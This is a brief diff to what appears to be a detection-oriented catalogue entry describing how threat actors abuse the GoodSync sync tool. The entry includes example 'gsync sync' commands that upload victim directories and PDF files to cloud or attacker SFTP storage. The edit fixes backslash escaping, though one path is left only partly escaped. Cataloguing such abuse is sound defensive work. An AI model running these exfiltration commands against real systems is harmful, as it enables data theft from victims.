@@ -80,7 +80,7 @@ UseCases:
     Description: >
       Threat actors configure a GoodSync job targeting cloud storage to recursively upload
       large volumes of victim data.
-    Command: "gsync sync /dir C:\Data /oneway /contact backblaze-profile"
+    Command: "gsync sync /dir C:\\Data /oneway /contact backblaze-profile"
   - Title: Silent CLI-based exfiltration
     Description: >
       gsync.exe used instead of the GUI for script-driven execution.
@@ -88,7 +88,7 @@ UseCases:
   - Title: Targeted exfiltration using filters
     Description: >
       Include/exclude rules restrict uploads to high-value file types.
-    Command: "gsync sync /dir C:\Users\Admin /include=*.pdf /exclude=*.iso"
+    Command: "gsync sync /dir C:\\Users\Admin /include=*.pdf /exclude=*.iso"
   - Title: SFTP-based exfiltration
     Description: >
       Sync job uploads data to attacker-controlled SFTP infrastructure.
